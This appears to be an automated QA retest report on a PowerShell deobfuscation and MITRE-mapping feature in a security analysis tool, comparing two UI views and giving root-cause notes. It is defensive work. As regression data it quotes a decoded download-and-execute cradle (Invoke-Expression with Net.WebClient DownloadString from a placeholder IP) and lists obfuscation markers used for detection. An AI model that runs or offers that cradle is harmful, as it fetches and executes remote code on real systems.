summary: Iteration 46 P0 parity RETEST — PASS. Verified frontend-only across /auto-investigate and /workspace using the acceptance octal-ASCII PowerShell payload plus an ordinary EDR incident with -EncodedCommand for regression. All 6 acceptance criteria of the review request pass. AUTO-INVESTIGATE (naked-PS payload): [data-testid=semantic-v2-panel-0] renders; semantic-v2-deob-0 shows EXACTLY 2 stages — #1 'Resolve .NET string format' (contains 'format'), #2 'Octal ASCII reconstruction' (contains 'octal'), case-insensitive match confirmed; semantic-v2-deob-final-0 contains "Write-Host 'Hello, from PowerShell!'"; semantic-v2-deob-boundary-0 explicitly states 'Deobfuscation halted at execution boundary Invoke-Expression …'; semantic-v2-story-0 renders Executive Summary (Verdict NEEDS_REVIEW, risk 39/100) + per-category tiles (initial_execution observed, process/network/file/persistence/credential/lateral not observed) + semantic-v2-story-mitre-all-0 = 'T1027 · T1027.010 · T1059.001' (all three required techniques present). AUTO-INVESTIGATE (ordinary EDR narrative wrapping powershell.exe -EncodedCommand SQBFAFgA…): still routes through the regular command-detection path — semantic-v2-panel-0 renders, deob chain applies 'Resolve cmdlet aliases', final payload = 'Invoke-Expression (New-Object Net.WebClient).DownloadString(\'http://1.2.3.4/p.ps1\')', MITRE roll-up contains T1059.001, T1071, T1071.001, T1105, T1620 — the new naked-PS fallback did NOT break the encoded-payload path. WORKSPACE (naked-PS payload): [data-testid=workspace-semantic-intelligence] still renders with the same 2 deob stages, same final resolved payload, boundary Invoke-Expression, storyline, and MITRE T1027 + T1027.010 (T1059.001 not surfaced in workspace mitre-all — minor delta vs auto-investigate, see minor note). No console errors, no React warnings on either tab.

issues: semantic-v2-story-mitre-all-0 on Workspace shows only T1027 · T1027.010 while Auto-Investigate correctly shows T1027 · T1027.010 · T1059.001 for the same payload. Both surfaces build the storyline from ps_semantic.analyze() so this is a subtle initial_execution flag divergence between the two pipelines (Workspace calls /decode/smart directly, Auto-Investigate wraps through the router). Not part of the current P0 acceptance criteria (which only requires T1027/T1027.010/T1059.001 on the Auto-Investigate tab), but worth aligning for consistency.

critical_code_review_comments: The naked-PS fallback in /app/backend/routers/auto_investigate.py::_fallback_naked_powershell synthesises a `powershell.exe -NoP -Command "…"` shell — the resolved payload on Auto-Investigate consequently shows the synthesised wrapper (`-NoP -Command "$cmDwhy = …"`) instead of the pure recovered script that Workspace shows. This is cosmetic (final payload still contains the recovered Write-Host string) but analysts comparing the two tabs will notice the wrapper. Consider stripping the synthesised `powershell.exe -NoP -Command ""` shell when rendering deob-final for naked-PS submissions so the two surfaces are byte-identical.

MITRE T1059.001 (PowerShell) is emitted by Auto-Investigate's initial_execution section but not by Workspace's storyline for the same input. Root cause is likely that Workspace's /decode/smart pass classifies initial_execution differently than the Auto-Investigate chain (which had the naked-PS wrapper synthesised). Unify by adding T1059.001 to defense_evasion/initial_execution whenever ps_semantic detects a PowerShell payload with boundary_op ∈ {Invoke-Expression, iex, IEX, &, .Invoke()}.

rca of the issue: Iteration 45's failure was that /auto-investigate saw the naked PowerShell script as free-form incident text (no LOLBIN binary detected → no command chain → chain.semantic empty). Iteration 46's fix (_fallback_naked_powershell + _PS_NAKED_MARKER_RE) synthesises a `powershell.exe -NoP -Command "…"` command_line entry whenever the raw text contains strong PS markers ([String]::Join, [Convert]::ToInt16, Invoke-Expression, [char][], -f formatter). That synthetic command feeds through the same decode/ps_semantic pipeline the encoded path uses, so chain.semantic is now populated identically for naked-PS payloads. Verified end-to-end in the UI: semantic-v2-* testids surface on Auto-Investigate with 2 recursive deob stages, boundary Invoke-Expression, and T1027/T1027.010/T1059.001 MITRE roll-up — matching the /workspace behavior.
